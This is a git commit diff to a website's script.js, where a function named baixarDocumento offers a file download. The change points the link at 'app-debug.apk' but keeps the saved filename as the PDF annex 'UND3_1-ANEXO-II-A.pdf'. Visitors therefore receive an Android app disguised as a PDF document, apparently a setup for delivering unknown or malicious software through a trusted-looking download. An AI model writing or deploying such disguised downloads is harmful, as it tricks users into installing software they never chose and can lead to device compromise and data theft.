affccfb3ca769d054ffa0f8194301d7860bfd7f2
Thawan Santos <sthawan860@gmail.com>
2025-04-05 14:41:03 -0300

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 function baixarDocumento() {
     const link = document.createElement('a');
-    link.href = 'UND3_1-ANEXO-II-A.pdf'; // Nome do arquivo que está no site
+    link.href = 'app-debug.apk'; // Nome do arquivo que está no site
     link.download = 'UND3_1-ANEXO-II-A.pdf'; // Nome do arquivo ao baixar
     document.body.appendChild(link);
     link.click();
